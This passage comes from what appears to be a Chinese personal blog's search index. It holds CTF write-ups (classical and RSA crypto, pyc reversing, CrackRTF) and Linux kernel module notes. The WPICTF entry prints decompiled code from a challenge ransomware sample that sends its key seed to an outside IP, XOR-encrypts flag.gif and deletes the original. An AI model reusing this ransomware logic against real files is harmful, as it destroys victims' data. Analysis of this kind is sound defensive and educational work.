&#39;m&#39;: &#39;abbaa&#39;,    &#39;n&#39;: &#39;abbab&#39;,    &#39;o&#39;: &#39;abbba&#39;,    &#39;p&#39;: &#39;abbbb&#39;,    &#39;q&#39;: &#39;baaaa&#39;,    &#39;r&#39;: &#39;baaab&#39;,    &#39;s&#39;: &#39;baaba&#39;,    &#39;t&#39;: &#39;baabb&#39;,    &#39;u&#39;: &#39;babaa&#39;,    &#39;v&#39;: &#39;babab&#39;,    &#39;w&#39;: &#39;babba&#39;,    &#39;x&#39;: &#39;babbb&#39;,    &#39;y&#39;: &#39;bbaaa&#39;,    &#39;z&#39;: &#39;bbaab&#39;&#125;def bacondecode(bacon):    msg = &#39;&#39;    codes = re.findall(r&#39;.&#123;5&#125;&#39;, bacon)    for code in codes:        if code == &#39;&#39;:            msg += &#39; &#39;        else:            UNCODE = dict(map(lambda t: (t[1], t[0]), CODE_TABLE.items()))            msg += UNCODE[code]    return msgflag = bacondecode(s)print(&#39;flag is &#39;, flag)# flag is  attackanddefenceworldisinteresting</code></pre><h4 id="easychallenge"><a href="#easychallenge" class="headerlink" title="easychallenge"></a>easychallenge</h4><p><code>re</code>和<code>crypto</code>一家石锤</p><p><code>pyc</code>没做任何修改，直接<code>uncompyle6</code>反编译，得到结果改一下算法逆向计算一下得到结果</p><pre><code class="python">import base64def encode1(ans):    s = &#39;&#39;    for i in ans:        x = ord(i) - 25        x = x ^ 36        s += chr(x)    return sdef encode2(ans):    s = &#39;&#39;    for i in ans:        x = i ^ 36        x = x - 36        s += chr(x)    return sdef encode3(ans):    return base64.b32decode(ans)flag = &#39; &#39;final = &#39;UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E===&#39;print(encode1(encode2(encode3(final))))# cyberpeace&#123;interestinghhhhh&#125;</code></pre><h4 id="Normal-RSA"><a href="#Normal-RSA" class="headerlink" title="Normal_RSA"></a>Normal_RSA</h4><p>这题算是进入了基本的<code>crypto</code>领域了</p><p>首先作为一个脚本小子，直接拿别人的工具就可以跑出结果</p><p><a href="https://github.com/3summer/CTF-RSA-tool">CTF-RSA-tool</a>很不错，虽然里面大部分的解法目前我还都不会</p><hr><p>正常解法</p><p>首先用<code>openssl</code>解析一下公钥</p><pre><code class="bash">-&gt; openssl rsa -pubin -text -modulus -in pubkey.pemRSA Public-Key: (256 bit)Modulus:    00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f:    1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f:    be:30:ddExponent: 65537 (0x10001)Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DDwriting RSA key-----BEGIN PUBLIC KEY-----MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDryigb/+l/vjDdAgMBAAE=-----END PUBLIC KEY-----</code></pre><p>得到了<code>n=0xC2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD</code>，<code>e=65537</code>，这个n不是很大，所以<code>yafu</code>直接分解，很快得到<code>p</code>和<code>q</code></p><pre><code class="bash">P39 = 319576316814478949870590164193048041239P39 = 275127860351348928173285174381581152299</code></pre><p>然后正常<code>rsa</code>的套路跑一边很快就可以得到结果</p><pre><code class="python">import gmpy2def bytes2num(b):    s = &#39;0x&#39;    for x in b:        tmp = str(hex(x))[2:]        if len(tmp) == 2:            pass        else:            tmp = &#39;0&#39; + tmp        #print(tmp)        s += tmp        num = int(s, 16)    return numdef num2str(n):    tmp = str(hex(n))[2:]    if len(tmp) % 2 == 0:        pass    else:        tmp = &#39;0&#39; + tmp    s = &#39;&#39;    for i in range(0, len(tmp), 2):        temp = tmp[i] + tmp[i + 1]        s += chr(int(temp, 16))    return sr = open(&quot;flag.enc&quot;, &quot;rb&quot;)r = r.read()r = bytes2num(r)e = 65537n = 87924348264132406875276140514499937145050893665602592992418171647042491658461p = 275127860351348928173285174381581152299q = 319576316814478949870590164193048041239d = gmpy2.invert(e, (p - 1) * (q - 1))#print(d)m = pow(r, int(d), n)print(num2str(m))# PCTF&#123;256b_i5_m3dium&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 攻防世界 </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux 驱动学习笔记</title>
      <link href="/2020/05/06/linux-%E9%A9%B1%E5%8A%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/05/06/linux-%E9%A9%B1%E5%8A%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>最近有想深入驱动和内核的想法，所以开始学习<em>ldd3</em>，参考着写一篇学习笔记</p><span id="more"></span><h4 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h4><h5 id="什么是驱动"><a href="#什么是驱动" class="headerlink" title="什么是驱动"></a>什么是驱动</h5><p>驱动在Linux内核中担任着特殊的角色，像是一个黑箱，隐藏掉设备工作的具体细节，并且具有模块化的特点，可以和内核的其他部分分开编译，并且可以随时装载卸载。</p><blockquote><p>the role of a device driver is providing mechanism, not policy</p></blockquote><p><em>mechanism</em>指的是提供什么样的方法，<em>policy</em>指的是这些方法可以怎样使用，将这两个问题分开解决，用程序不同的部分甚至是不同的程序去实现，可以使开发变得更简单。</p><p>书中举了一个很简单的例子可以帮助很好的理解，Linux图形界面显示就可以分为两部分，一部分是X Server用以驱动显卡并给替它程序提供接口，另一部分就是我们比较熟悉的窗口管理器(比如我现在用的gnome-session)，在之前安装arch linux的时候有很深的体会。</p><blockquote><p>When writing drivers, a programmer should pay particular attention to this fundamental concept: write kernel code to access the hardware, but don’t force particular policies on the user, since different users have different needs.</p></blockquote><p>这句话很关键，驱动程序只需要提供调用硬件的接口就可以了，并且越是<em>policy free</em>就越有利于实现应用可以在不同的环境下运行</p><h5 id="内核浅析"><a href="#内核浅析" class="headerlink" title="内核浅析"></a>内核浅析</h5><p>在Unix系统中，进程会请求很多系统资源，比如cpu算力，内存，网络或者是其他资源，内核，简单来说，就是一堆可执行的代码，负责管理这些请求。内核大致可以分为以下几个部分：</p><ul><li><p>进程管理</p><p>管理创建和销毁进程，进程之间的通信或者是cpu的分配</p></li><li><p>内存管理</p><p>内存管理其负责为程序分配虚拟内存</p></li><li><p>文件系统</p><p>以前看过这样一句话，几乎Unix系统中的一切都可以当作文件来看</p></li><li><p>设备控制</p><p>提供驱动管理，就是目前学习的重点</p></li><li><p>网络</p></li></ul><h5 id="模块化"><a href="#模块化" class="headerlink" title="模块化"></a>模块化</h5><blockquote><p>Each piece of code that can be added to the kernel at runtime is called a module.</p></blockquote><p>模块可以通过<code>insmod</code>装载并且可以通过<code>rmmod</code>卸载</p><p>模块也有很多种类，但分类的方式并不绝对，本书中分为了三类</p><ul><li><em>a char module</em></li><li><em>a block module</em></li><li><em>a network module</em></li></ul><p>内核中的各种功能，无论是硬件还是软件，都是模块化的</p><h5 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h5><p>如果内核存在安全漏洞，整个系统就是不安全的。系统通过调用<em>init_module</em>来检测用户是否有权限，也只有有权限的用户才可以装载模块</p><h4 id="从hello-world开始"><a href="#从hello-world开始" class="headerlink" title="从hello world开始"></a>从hello world开始</h4><p>第一个程序惯例从<code>hello world</code>开始，先写一个很简单的程序，即使没有任何内核基础也能看出大概意思来</p><pre><code class="c">//hello.c#include&lt;linux/init.h&gt;#include&lt;linux/module.h&gt;MODULE_LICENSE(&quot;Dual BSD/GPL&quot;);static int hello_init(void)&#123;    printk(KERN_ALERT&quot;Hello,world\n&quot;);    return 0;&#125;static void hello_exit(void)&#123;    printk(KERN_ALERT&quot;Goodbye,cruel world\n&quot;);&#125;module_init(hello_init);module_exit(hello_exit);</code></pre><p>这个模块定义了两个函数，一个在模块载入(通过<code>module_init</code>加载)的时候调用，一个在模块卸载(通过<code>module_exit</code>加载)的时候调用，<code>module_init</code>和<code>module_exit</code>是指定函数作用的两个宏定义。另外一个宏定义就是<code>MODULE_LICENSE</code>，这里用来指定的是<code>free license</code>，没有<code>license</code>的模块在装载的时候会因为安全问题被禁用，导致装载失败。</p><p><code>printk</code>顾名思义就是打印，很像<code>printf</code>，但是是打印在<code>log</code>里，可以使用<code>dmesg</code>命令查看。</p><blockquote><p>注意在make的之前要先安装<code>linux-header</code>，我的环境是<code>kali</code>，使用的命令时是</p><pre><code class="bash">sudo apt-get install linux-headers-$(uname -r)</code></pre></blockquote><p><code>Makefile</code>如下</p><pre><code class="makefile">ifeq ($(KERNELRELEASE),)    # Assume the source tree is where the running kernel was built    # You should set KERNELDIR in the environment if it&#39;s elsewhere    KERNELDIR ?= /lib/modules/$(shell uname -r)/build    # The current directory is passed to sub-makes as argument    PWD := $(shell pwd)modules:    $(MAKE) -C $(KERNELDIR) M=$(PWD) modulesmodules_install:    $(MAKE) -C $(KERNELDIR) M=$(PWD) modules_installclean:    rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions Module.symvers modules.order.PHONY: modules modules_install cleanelse    # called from kernel build system: just declare what our modules are    obj-m := hello.oendif</code></pre><p><code>make</code>成功之后使用<code>sudo insmod hello.ko</code>加载模块，使用<code>sudo rmmod hello.ko</code>卸载模块，之后可以使用<code>sudo dmesg</code>查看打印出来的信息</p><p><img src="/2020/05/06/linux-%E9%A9%B1%E5%8A%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/hello.png" alt="hello"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux驱动 </tag>
            
            <tag> kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WPICTF-re-wp</title>
      <link href="/2020/04/20/WPICTF-re-wp/"/>
      <url>/2020/04/20/WPICTF-re-wp/</url>
      
        <content type="html"><![CDATA[<p>这次的比赛只有两道re，全都是malware，不难，也还挺有意思</p><span id="more"></span><h4 id="danger-Live-and-Malicious-Code"><a href="#danger-Live-and-Malicious-Code" class="headerlink" title="danger-Live-and-Malicious-Code"></a>danger-Live-and-Malicious-Code</h4><p>病毒的代码里面混进了flag，js的语法也不是特别懂，发现了很多处理字符串的函数，所以干脆<code>console.log</code>都输出了出来，发现输出的<code>url</code>中间夹了flag</p><pre><code>WPI&#123;Oh_nose_procoding_detected&#125;</code></pre><h4 id="NotWannasigh"><a href="#NotWannasigh" class="headerlink" title="NotWannasigh"></a>NotWannasigh</h4><p>首先看下<code>ransom note</code></p><pre><code>Haha! Your precious file flag.gif has been encrypted by my new and improved ransomware NotWannasigh! You must send bitcoin to &quot;bitpay.com/83768&quot; to get the decryption key. You should act fast because in 48 hours I will delete the key. Muahahahaha! - def-not-h4ckah(Hi, CTF challenge creator here. You should _NEVER_ pay the ransom. If you send bitcoin to that BTC wallet then you will ONLY be donating to charity (and hey, that&#39;s really nice of you, Mental Health Hackers is a great organization). I will NOT send you the decryption key)</code></pre><p>题目中所给的<code>flag-gif.EnCiPhErEd</code>应该就是加密过的文件，解密就可以得到flag，给的流量包暂时不知道作用是什么，干脆先看看程序的实现</p><pre><code class="c++">*(_QWORD *)seed = time(0LL);  srand(seed[0]);  fd = socket(2, 1, 0);  if ( fd == -1 )  &#123;    puts(&quot;could not create socket&quot;);  &#125;  else  &#123;    puts(&quot;created socket&quot;);    *(_DWORD *)&amp;addr.sa_data[2] = inet_addr(&quot;108.61.127.136&quot;);    addr.sa_family = 2;    *(_WORD *)addr.sa_data = htons(0x50u);    if ( connect(fd, &amp;addr, 0x10u) &gt;= 0 )    &#123;      puts(&quot;connected&quot;);      sprintf(&amp;s, &quot;%d&quot;, *(_QWORD *)seed);      if ( send(fd, &amp;s, 0xAuLL, 0) &gt;= 0 )        puts(&quot;sent&quot;);      else        puts(&quot;send failed&quot;);    &#125;    else    &#123;      puts(&quot;connect error&quot;);    &#125;  &#125;</code></pre><p>先根据当前时间生成了一个随机数种子，然后进行通信，把这个种子发给了一个ip，这个种子肯定是后面生成随机数用的，所以肯定是有用的，这也就是流量包的作用，根据流量信息可以获得这个随机数种子的值<code>1585599106</code></p><p>下面生成了一个随机数序列</p><pre><code class="c++">  puts(&quot;targetting flag.gif&quot;);  stream = fopen(&quot;flag.gif&quot;, &quot;r+&quot;);  fseek(stream, 0LL, 2);  v19 = ftell(stream);  fseek(stream, 0LL, 0);  printf(&quot;fileSize = %d\n&quot;, (unsigned int)v19);  v18 = v19 - 1LL;  v8 = v19;  v9 = 0LL;  v3 = alloca(16 * ((v19 + 15LL) / 0x10uLL));  v17 = &amp;v6;  for ( i = 0; i &lt; v19; ++i )    *((_BYTE *)v17 + i) = rand();  puts(&quot;key generated by 256&quot;);</code></pre><p>生成了key，下面是加密过程</p><pre><code class="c++">for ( j = 0; ; ++j )  &#123;    v14 = fgetc(stream);    if ( j &gt;= v19 )      break;    *((_BYTE *)v15 + j) = v14 ^ *((_BYTE *)v17 + j);  &#125;  fclose(stream);  remove(&quot;flag.gif&quot;);  v13 = fopen(&quot;flag-gif.EnCiPhErEd&quot;, &quot;w+&quot;);  for ( k = 0; k &lt; v19; ++k )    fputc(*((unsigned __int8 *)v15 + k), v13);  fclose(v13);</code></pre><p>简单异或之后写入文件，所以生成随机数序列之后再异或回来就好了</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;cstdio&gt;using namespace std;int main()&#123;    srand(1585599106);    FILE *s = fopen(&quot;../flag-gif.EnCiPhErEd&quot;, &quot;r&quot;);    int index = 0;    FILE *f = fopen(&quot;../flag.gif&quot;, &quot;w+&quot;);    while (!feof(s))    &#123;        int uVar1 = rand()&amp;0xff;        int8_t tmp2=fgetc(s);        int8_t tmp = uVar1 ^ tmp2;        fputc(tmp, f);        index = (int32_t)index + 1;    &#125;    fclose(s);    fclose(f);    return 0;&#125;</code></pre><p>这个脚本要在linux下跑，因为win的随机数生成的不一样</p><p>得到了含有flag的gif</p><p><img src="/2020/04/20/WPICTF-re-wp/flag.gif" alt="flag"></p><p>flag有点难读，第一遍还读错了一位</p><pre><code>WPI&#123;It_always_feels_a_little_weird_writing_malware&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
            <tag> WPICTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fibonacci-JavisOJ-wp</title>
      <link href="/2020/04/01/CrackRTF-buuctf/"/>
      <url>/2020/04/01/CrackRTF-buuctf/</url>
      
        <content type="html"><![CDATA[<p>这一题用到了一些windows加密算法中的东西</p><span id="more"></span><p>根据字符串找到了关键的部分函数</p><pre><code class="c++">void FUN_00401690(void)&#123;  size_t sVar1;  uint uVar2;  int iVar3;  undefined4 *puVar4;  char *pcVar5;  undefined4 local_354 [16];  BYTE local_314 [260];  int local_210;  char local_20c [260];  byte local_108 [256];  undefined4 uStack8;    iVar3 = 0xd4;  puVar4 = local_354;  while (iVar3 != 0) &#123;    iVar3 = iVar3 + -1;    *puVar4 = 0xcccccccc;    puVar4 = puVar4 + 1;  &#125;  _memset(local_108,0,0x104);  _memset(local_20c,0,0x104);  local_210 = 0;  FUN_00401e60((byte *)&quot;pls input the first passwd(1): &quot;);  FUN_00401e00(&amp;DAT_00426104);  sVar1 = _strlen((char *)local_108);  if (sVar1 != 6) &#123;    FUN_00401e60((byte *)&quot;Must be 6 characters!\n&quot;);    ExitProcess(0);    __chkesp();  &#125;  local_210 = FUN_00401c30(local_108);  if (local_210 &lt; 100000) &#123;    ExitProcess(0);    __chkesp();  &#125;  FID_conflict:_strcat((char *)local_108,&quot;@DBApp&quot;);  pcVar5 = local_20c;  sVar1 = _strlen((char *)local_108);  thunk_FUN_00401230(local_108,sVar1,pcVar5);  iVar3 = __strcmpi(local_20c,&quot;6E32D0943418C2C33385BC35A1470250DD8923A9&quot;);  if (iVar3 == 0) &#123;    FUN_00401e60((byte *)&quot;continue...\n\n&quot;);    FUN_00401e60((byte *)&quot;pls input the first passwd(2): &quot;);    _memset(local_314,0,0x104);    FUN_00401e00(&amp;DAT_00426104);    sVar1 = _strlen((char *)local_314);    if (sVar1 != 6) &#123;      FUN_00401e60((byte *)&quot;Must be 6 characters!\n&quot;);      ExitProcess(0);      __chkesp();    &#125;    FID_conflict:_strcat((char *)local_314,(char *)local_108);    _memset(local_20c,0,0x104);    pcVar5 = local_20c;    sVar1 = _strlen((char *)local_314);    thunk_FUN_00401040(local_314,sVar1,pcVar5);    iVar3 = __strcmpi(&quot;27019e688a4e62a649fd99cadaafdb4e&quot;,local_20c);    if (iVar3 == 0) &#123;      uVar2 = thunk_FUN_004014d0((LPCSTR)local_314);      if ((uVar2 &amp; 0xff) == 0) &#123;        FUN_00401e60((byte *)&quot;Error!!\n&quot;);        ExitProcess(0);        __chkesp();      &#125;      else &#123;        FUN_00401e60((byte *)&quot;bye ~~\n&quot;);      &#125;    &#125;  &#125;  uStack8 = 0x4018f6;  __chkesp();  return;&#125;</code></pre><p>需要pass两层密码才可以，仔细看一下加密的部分</p><pre><code class="c++">void __cdecl FUN_00401230(BYTE *param_1,DWORD param_2,LPSTR param_3)&#123;  int iVar1;  undefined4 *puVar2;  undefined4 local_6c [16];  uint local_2c;  CHAR local_28 [4];  byte local_24 [20];  DWORD local_10;  HCRYPTHASH local_c;  HCRYPTPROV local_8;    iVar1 = 0x1a;  puVar2 = local_6c;  while (iVar1 != 0) &#123;    iVar1 = iVar1 + -1;    *puVar2 = 0xcccccccc;    puVar2 = puVar2 + 1;  &#125;  CryptAcquireContextA(&amp;local_8,(LPCSTR)0x0,(LPCSTR)0x0,1,0xf0000000);  iVar1 = __chkesp();  if (iVar1 != 0) &#123;    CryptCreateHash(local_8,0x8004,0,0,&amp;local_c);    iVar1 = __chkesp();    if (iVar1 == 0) &#123;      CryptReleaseContext(local_8,0);      __chkesp();    &#125;    else &#123;      CryptHashData(local_c,param_1,param_2,0);      iVar1 = __chkesp();      if (iVar1 == 0) &#123;        CryptDestroyHash(local_c);        __chkesp();        CryptReleaseContext(local_8,0);        __chkesp();      &#125;      else &#123;        CryptGetHashParam(local_c,2,local_24,&amp;local_10,0);        __chkesp();        *param_3 = &#39;\0&#39;;        local_2c = 0;        while (local_2c &lt; local_10) &#123;          wsprintfA(local_28,&quot;%02X&quot;,(uint)local_24[local_2c]);          __chkesp();          lstrcatA(param_3,local_28);          __chkesp();          local_2c = local_2c + 1;        &#125;        CryptDestroyHash(local_c);        __chkesp();        CryptReleaseContext(local_8,0);        __chkesp();      &#125;    &#125;  &#125;  local_8 = 0x4013b8;  __chkesp();  return;&#125;</code></pre><p>第一层加密，重点看看一个函数<code>CryptCreateHash(local_8,0x8004,0,0,&amp;local_c)</code></p><p>上微软查查定义</p><pre><code class="c++">BOOL CryptCreateHash(  HCRYPTPROV hProv,  ALG_ID     Algid,  HCRYPTKEY  hKey,  DWORD      dwFlags,  HCRYPTHASH *phHash);</code></pre><p><code>hProv</code><br>A handle to a CSP created by a call to <a href="https://docs.microsoft.com/windows/desktop/api/wincrypt/nf-wincrypt-cryptacquirecontexta">CryptAcquireContext</a>.</p><p><code>Algid</code><br>An <a href="https://docs.microsoft.com/windows/desktop/SecCrypto/alg-id">ALG_ID</a> value that identifies the hash algorithm to use.</p><p>Valid values for this parameter vary, depending on the CSP that is used. For a list of default algorithms, see Remarks.</p><p><code>hKey</code><br>If the type of hash algorithm is a keyed hash, such as the <a href="https://docs.microsoft.com/windows/desktop/SecGloss/h-gly">Hash-Based Message Authentication Code</a> (HMAC) or <a href="https://docs.microsoft.com/windows/desktop/SecGloss/m-gly">Message Authentication Code</a> (MAC) algorithm, the key for the hash is passed in this parameter. For nonkeyed algorithms, this parameter must be set to zero.</p><p>For keyed algorithms, the key must be to a <a href="https://docs.microsoft.com/windows/desktop/SecGloss/b-gly">block cipher</a> key, such as RC2, that has a <a href="https://docs.microsoft.com/windows/desktop/SecGloss/c-gly">cipher mode</a> of <a href="https://docs.microsoft.com/windows/desktop/SecGloss/c-gly">Cipher Block Chaining</a> (CBC).</p><p><code>dwFlags</code><br>The following flag value is defined.</p><table><thead><tr><th align="left">Value</th><th align="left">Meaning</th></tr></thead><tbody><tr><td align="left"><strong>CRYPT_SECRETDIGEST</strong>0x00000001</td><td align="left">This flag is not used.</td></tr></tbody></table><p><code>phHash</code><br>The address to which the function copies a handle to the new hash object. When you have finished using the hash object, release the handle by calling the <a href="https://docs.microsoft.com/windows/desktop/api/wincrypt/nf-wincrypt-cryptdestroyhash">CryptDestroyHash</a> function.</p><p>需要关注<code>Algid</code>，定义了加密的方式，在 <a href="https://docs.microsoft.com/windows/desktop/SecCrypto/alg-id">ALG_ID</a> 查一下<code>0x8004</code></p><table><thead><tr><th align="left">Identifier</th><th align="left">Value</th><th align="left">Description</th></tr></thead><tbody><tr><td align="left">CALG_SHA</td><td align="left">0x00008004</td><td align="left">SHA hashing algorithm. This algorithm is supported by the <a href="https://docs.microsoft.com/zh-cn/windows/win32/seccrypto/microsoft-base-cryptographic-provider">Microsoft Base Cryptographic Provider</a>.</td></tr><tr><td align="left">CALG_SHA1</td><td align="left">0x00008004</td><td align="left">Same as <strong>CALG_SHA</strong>. This algorithm is supported by the <a href="https://docs.microsoft.com/zh-cn/windows/win32/seccrypto/microsoft-base-cryptographic-provider">Microsoft Base Cryptographic Provider</a>.</td></tr></tbody></table><p><code>sha1</code>加密，对我们输入的6位纯数字和后面接上的字符串进行sha1加密然后直接进行字符串对比，知道是数字所以爆破非常简单</p><pre><code class="python">import hashlibflag2 = &#39;@DBApp&#39;for i in range(100000, 999999):    h2 = hashlib.sha1((str(i) + flag2).encode(&#39;utf-8&#39;))    flags = h2.hexdigest()    if &quot;6e32d0943418c2c33385bc35a1470250dd8923a9&quot; == flags:        print(str(i) + flag2)        print(flags)</code></pre><p>输出得到第一部分的密码</p><pre><code>123321@DBApp6e32d0943418c2c33385bc35a1470250dd8923a9</code></pre><p>然后看一下下一部分加密</p><pre><code class="c++">void __cdecl FUN_00401040(BYTE *param_1,DWORD param_2,LPSTR param_3)&#123;  int iVar1;  undefined4 *puVar2;  undefined4 local_68 [16];  uint local_28;  CHAR local_24 [4];  byte local_20 [16];  DWORD local_10;  HCRYPTHASH local_c;  HCRYPTPROV local_8;    iVar1 = 0x19;  puVar2 = local_68;  while (iVar1 != 0) &#123;    iVar1 = iVar1 + -1;    *puVar2 = 0xcccccccc;    puVar2 = puVar2 + 1;  &#125;  CryptAcquireContextA(&amp;local_8,(LPCSTR)0x0,(LPCSTR)0x0,1,0xf0000000);  iVar1 = __chkesp();  if (iVar1 != 0) &#123;    CryptCreateHash(local_8,0x8003,0,0,&amp;local_c);    iVar1 = __chkesp();    if (iVar1 == 0) &#123;      CryptReleaseContext(local_8,0);      __chkesp();    &#125;    else &#123;      CryptHashData(local_c,param_1,param_2,0);      iVar1 = __chkesp();      if (iVar1 == 0) &#123;        CryptDestroyHash(local_c);        __chkesp();        CryptReleaseContext(local_8,0);        __chkesp();      &#125;      else &#123;        CryptGetHashParam(local_c,2,local_20,&amp;local_10,0);        __chkesp();        *param_3 = &#39;\0&#39;;        local_28 = 0;        while (local_28 &lt; local_10) &#123;          wsprintfA(local_24,&quot;%02X&quot;,(uint)local_20[local_28]);          __chkesp();          lstrcatA(param_3,local_24);          __chkesp();          local_28 = local_28 + 1;        &#125;        CryptDestroyHash(local_c);        __chkesp();        CryptReleaseContext(local_8,0);        __chkesp();      &#125;    &#125;  &#125;  local_8 = 0x4011c8;  __chkesp();  return;&#125;</code></pre><p>和上面的加密几乎一样，但是这次是<code>0x8003</code>，再查一查</p><table><thead><tr><th align="left">Identifier</th><th align="left">Value</th><th align="left">Description</th></tr></thead><tbody><tr><td align="left">CALG_MD5</td><td align="left">0x00008003</td><td align="left">MD5 hashing algorithm. This algorithm is supported by the <a href="https://docs.microsoft.com/zh-cn/windows/win32/seccrypto/microsoft-base-cryptographic-provider">Microsoft Base Cryptographic Provider</a>.</td></tr></tbody></table><p><code>md5</code>加密，并且没有限定字符的范围，<del>下辈子都跑不出来</del></p><p>再往下面看，两层加密都通过之后</p><pre><code class="c++">void __cdecl FUN_004014d0(LPCSTR param_1)&#123;  int iVar1;  undefined4 *puVar2;  undefined4 local_64 [16];  undefined4 local_24;  LPCVOID local_20;  undefined4 local_1c;  DWORD local_18;  uint local_14;  HGLOBAL local_10;  HRSRC local_c;  HANDLE local_8;    iVar1 = 0x18;  puVar2 = local_64;  while (iVar1 != 0) &#123;    iVar1 = iVar1 + -1;    *puVar2 = 0xcccccccc;    puVar2 = puVar2 + 1;  &#125;  local_8 = (HANDLE)0x0;  local_c = (HRSRC)0x0;  local_10 = (HGLOBAL)0x0;  local_14 = 0;  local_18 = 0;  local_1c = 0;  local_20 = (LPCVOID)0x0;  local_24 = 0;  FindResourceA((HMODULE)0x0,(LPCSTR)0x65,&quot;AAA&quot;);  local_c = (HRSRC)__chkesp();  if (local_c != (HRSRC)0x0) &#123;    SizeofResource((HMODULE)0x0,local_c);    local_14 = __chkesp();    LoadResource((HMODULE)0x0,local_c);    local_10 = (HGLOBAL)__chkesp();    if (local_10 != (HGLOBAL)0x0) &#123;      LockResource(local_10);      local_20 = (LPCVOID)__chkesp();      thunk_FUN_00401420(param_1,(int)local_20,local_14);      CreateFileA(&quot;dbapp.rtf&quot;,0x10000000,0,(LPSECURITY_ATTRIBUTES)0x0,2,0x80,(HANDLE)0x0);      local_8 = (HANDLE)__chkesp();      if (local_8 != (HANDLE)0xffffffff) &#123;        WriteFile(local_8,local_20,local_14,&amp;local_18,(LPOVERLAPPED)0x0);        iVar1 = __chkesp();        if (iVar1 != 0) &#123;          CloseHandle(local_8);          __chkesp();        &#125;      &#125;    &#125;  &#125;  local_8 = (HANDLE)0x40162d;  __chkesp();  return;&#125;</code></pre><p>写了一个<code>dbapp.rtf</code>，写入的内容在上面一个函数</p><pre><code class="c++">void __cdecl FUN_00401420(LPCSTR param_1,int param_2,uint param_3)&#123;  uint uVar1;  int iVar2;  undefined4 *puVar3;  undefined4 local_50 [16];  uint local_10;  LPCSTR local_c;  undefined4 local_8;    iVar2 = 0x13;  puVar3 = local_50;  while (iVar2 != 0) &#123;    iVar2 = iVar2 + -1;    *puVar3 = 0xcccccccc;    puVar3 = puVar3 + 1;  &#125;  lstrlenA(param_1);  uVar1 = __chkesp();  local_c = param_1;  local_10 = 0;  while (local_10 &lt; param_3) &#123;    *(byte *)(param_2 + local_10) = *(byte *)(param_2 + local_10) ^ param_1[local_10 % uVar1];    local_10 = local_10 + 1;  &#125;  local_8 = 0x4014a3;  __chkesp();  return;&#125;</code></pre><p>发现前面不知从哪里获取了一些内容，然后和我们输入的密码进行了一个循环异或，写入一个<code>rtf</code>文件</p><p>这里有一个点就是<code>rtf</code>文件的文件头是固定的6个字符，可以通过这里来算出来输入的第二次密码是什么</p><p>可以用<code>ResourceHacker</code>看一下<code>AAA</code>到底是什么</p><p><img src="/2020/04/01/CrackRTF-buuctf/AAA.png" alt="AAA"></p><p>然后异或一下出来密码</p><pre><code class="python">s = &quot;&#123;\\rtf1&quot; a = [0x05,0x7D,0x41,0x15,0x26,0x01] flag = &quot;&quot;for i in range(0,len(s)):    x = ord(s[i]) ^ a[i]    flag += chr(x)print(flag)</code></pre><p>得到第二个密码<code>~!3a@0</code></p><p>两个都通过后会生成一个<code>rtf</code>文件，内容是<code>flag</code></p><pre><code>Flag&#123;N0_M0re_Free_Bugs&#125;</code></pre><p>但是提交的时候要交小写的<code>flag</code></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
            <tag> re </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fibonacci-JavisOJ-wp</title>
      <link href="/2020/04/01/Fibonacci-JavisOJ-wp/"/>
      <url>/2020/04/01/Fibonacci-JavisOJ-wp/</url>
      
        <content type="html"><![CDATA[<p>这题涉及到<code>jar2exe</code>的知识，所以单独拿出来写一下，顺便写一写<code>jar2exe</code>怎么入手</p><span id="more"></span><blockquote><p>这种方法并不适用于<code>jar2exe</code>当前的最新版(2.1.7)，经过我的测试2.1.2试可用的，而且由于2.1.2的第三种加密方式还没有这么激进，后续其它版本应该也是支持的，还需要再试验。</p></blockquote><h4 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h4><p>拿到题目<code>DIE</code>查一下，发现不是一个普通的可执行文件</p><p><img src="/2020/04/01/Fibonacci-JavisOJ-wp/1.png" alt="1"></p><p>也就是说这本来是一个<code>jar</code>文件，通过<code>jar2exe</code>的方式转换成了windows可执行文件</p><h4 id="Jar2Exe"><a href="#Jar2Exe" class="headerlink" title="Jar2Exe"></a>Jar2Exe</h4><p>一共有3种保护方式</p><ul><li>不隐藏也不加密</li><li>隐藏</li><li>隐藏且加密</li></ul><h5 id="Level1"><a href="#Level1" class="headerlink" title="Level1"></a>Level1</h5><p>第一种方式非常简单，只需要在16进制编辑器中找到第一个<code>PK</code>，即<code>zip</code>的文件头，然后把这之后的另存为新文件，就可以了。但是这一题并不是采用这种方式，以这种方式提取出来的程序只包含很多生成出来的附加文件。</p><p><del>其实也可以直接用<code>winrar</code>打开</del></p><h5 id="Level2"><a href="#Level2" class="headerlink" 